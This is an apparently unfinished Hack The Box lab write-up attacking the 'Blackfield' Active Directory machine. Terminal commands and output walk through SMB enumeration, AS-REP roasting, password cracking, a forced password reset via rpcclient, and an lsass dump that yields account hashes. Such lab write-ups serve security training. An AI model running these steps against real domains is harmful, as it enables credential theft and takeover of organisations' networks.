---
title: "[HTB] Blackfield"
permalink: /writeups/htb/blackfield/
excerpt: "Quick write-up for the Blackfield machine from Hack The Box."
tags:
  - hackthebox
  - activedirectory
  - pentest
  - writeup
---

---

{% include toc icon="cog" title="Blackfield Solution" %}

The [Blackfield](https://app.hackthebox.com/machines/Blackfield) machine has been created by [aas](https://app.hackthebox.com/users/6259). This is an hard Windows Machine with a strong focus on Active Directory exploitation.
{: .text-justify}

![image-center](/images/htb/htb_blackfield_infocard.png){: .align-center}

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).
{: .notice--info}

```bash
$ nmap -sV -Pn 10.129.155.211
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 09:11 EST
Nmap scan report for 10.129.155.211
Host is up (0.018s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-11 21:11:21Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.56 seconds
```

blackfield.local


$ smbclient -N -L \\\\10.129.155.211\\forensic

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available


smbclient \\\\10.129.155.211\\forensic -U ""


$ smbclient \\\\10.129.155.211\\forensic                                                                                                                                130 ⨯
Enter WORKGROUP\ax's password: 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
                                                                                                                                                                                
┌──(ax㉿nms)-[~]
└─$ smbclient \\\\10.129.155.211\\profiles$                                                                                                                               130 ⨯
Enter WORKGROUP\ax's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020
  ANavay                              D        0  Wed Jun  3 12:47:11 2020
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020
  APustulka                           D        0  Wed Jun  3 12:47:11 2020
  ARotella                            D        0  Wed Jun  3 12:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020
  ASischo                             D        0  Wed Jun  3 12:47:11 2020
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020
  ATakach                             D        0  Wed Jun  3 12:47:11 2020
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                5102079 blocks of size 4096. 1691612 blocks available
smb: \> 

smb: \> cd AAlleni
smb: \AAlleni\> ls
  .                                   D        0  Wed Jun  3 12:47:11 2020
  ..                                  D        0  Wed Jun  3 12:47:11 2020

                5102079 blocks of size 4096. 1692288 blocks available
smb: \AAlleni\> 


$ smbclient \\\\10.129.155.211\\profiles$
Enter WORKGROUP\ax's password: 
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> prompt off
smb: \> mget *
smb: \>


```bash
$ impacket-GetNPUsers blackfield.local/ -usersfile users.txt -dc-ip 10.129.155.211
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

...[snip]...

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$support@BLACKFIELD.LOCAL:eab3cec4ef7550d9f7336270ab461115$51de4e1de9d432eb82a3fd26eeacfe2ea6809dc28d91eeac0b3772e99241f3834a1e8c5ec98ec13f04546176ddac6835f1e113441df5c8d1fb6e62c4446477a543471ca5062eb4c6d63e6047f43ac695d71fd7e2b7c98d0b26dbb2b49ca792dd28a11ef7a3a158a75a042e78f5116282ccfbc0087293a0aedc9ea2b38299614d1671546f228a92c2c8456af9b2cf485f5a36f0b74c92bbea557f3136072403345e804e21631a7bc0f9f3e657eaada6b37da2275d2ced68779d4978aacbc0fd6520fe8a386763b10c07c4e1b799f0ba338c98bfc7c719b1f2ae3d55e5663a47698fb3df8e3c764dfd03045d3abdd4f215c3d17db0
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

...[snip]...

```


```bash
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:21 DONE (2022-02-11 09:32) 0.04608g/s 660597p/s 660597c/s 660597C/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
$ crackmapexec smb 10.129.155.211 -d blackfield.local -u support -p '#00^BlackKnight'
SMB         10.129.155.211  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.155.211  445    DC01             [+] blackfield.local\support:#00^BlackKnight 
```

```bash
$ bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.155.211 --zip                    
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 04S
INFO: Compressing output into 20220211094020_bloodhound.zip
```

evil-winrm does not work

https://malicious.link/post/2017/reset-ad-user-password-with-linux/

$ rpcclient -U blackfield.local/support 10.129.155.211
Enter BLACKFIELD.LOCAL\support's password: 
rpcclient $> setuserinfo audit2020 23 Qwerty1!
rpcclient $> 


$ crackmapexec smb 10.129.155.211 -d blackfield.local -u audit2020 -p 'Qwerty1!'
SMB         10.129.155.211  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.155.211  445    DC01             [+] blackfield.local\audit2020:Qwerty1! 


$ crackmapexec smb 10.129.155.211 -d blackfield.local -u audit2020 -p 'Qwerty1!' --shares
SMB         10.129.155.211  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.155.211  445    DC01             [+] blackfield.local\audit2020:Qwerty1! 
SMB         10.129.155.211  445    DC01             [+] Enumerated shares
SMB         10.129.155.211  445    DC01             Share           Permissions     Remark
SMB         10.129.155.211  445    DC01             -----           -----------     ------
SMB         10.129.155.211  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.155.211  445    DC01             C$                              Default share
SMB         10.129.155.211  445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.155.211  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.155.211  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.155.211  445    DC01             profiles$       READ            
SMB         10.129.155.211  445    DC01             SYSVOL          READ            Logon server share 


$ smbclient \\\\10.129.155.211\\forensic -U audit2020
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                5102079 blocks of size 4096. 1687478 blocks available
smb: \> prompt off
smb: \> recurse
smb: \> mget *
getting file \commands_output\domain_admins.txt of size 528 as commands_output/domain_admins.txt (7.8 KiloBytes/sec) (average 7.8 KiloBytes/sec)
getting file \commands_output\domain_groups.txt of size 962 as commands_output/domain_groups.txt (13.8 KiloBytes/sec) (average 10.9 KiloBytes/sec)
getting file \commands_output\domain_users.txt of size 16454 as commands_output/domain_users.txt (229.5 KiloBytes/sec) (average 85.9 KiloBytes/sec)
getting file \commands_output\firewall_rules.txt of size 518202 as commands_output/firewall_rules.txt (3244.0 KiloBytes/sec) (average 1454.4 KiloBytes/sec)
getting file \commands_output\ipconfig.txt of size 1782 as commands_output/ipconfig.txt (23.5 KiloBytes/sec) (average 1210.4 KiloBytes/sec)
getting file \commands_output\netstat.txt of size 3842 as commands_output/netstat.txt (51.4 KiloBytes/sec) (average 1043.5 KiloBytes/sec)
getting file \commands_output\route.txt of size 3976 as commands_output/route.txt (58.0 KiloBytes/sec) (average 928.5 KiloBytes/sec)
getting file \commands_output\systeminfo.txt of size 4550 as commands_output/systeminfo.txt (57.0 KiloBytes/sec) (average 824.2 KiloBytes/sec)
getting file \commands_output\tasklist.txt of size 9990 as commands_output/tasklist.txt (126.7 KiloBytes/sec) (average 750.6 KiloBytes/sec)
getting file \memory_analysis\conhost.zip of size 37876530 as memory_analysis/conhost.zip (12508.9 KiloBytes/sec) (average 10183.4 KiloBytes/sec)
getting file \memory_analysis\ctfmon.zip of size 24962333 as memory_analysis/ctfmon.zip (10048.3 KiloBytes/sec) (average 10129.8 KiloBytes/sec)
getting file \memory_analysis\dfsrs.zip of size 23993305 as memory_analysis/dfsrs.zip (11519.6 KiloBytes/sec) (average 10476.8 KiloBytes/sec)
getting file \memory_analysis\dllhost.zip of size 18366396 as memory_analysis/dllhost.zip (8280.7 KiloBytes/sec) (average 10015.5 KiloBytes/sec)

...[snip]...


$ unzip lsass.zip          
Archive:  lsass.zip
  inflating: lsass.DMP               

$ pypykatz lsa minidump lsass.DMP                                                                                                                                         2 ⨯
INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None

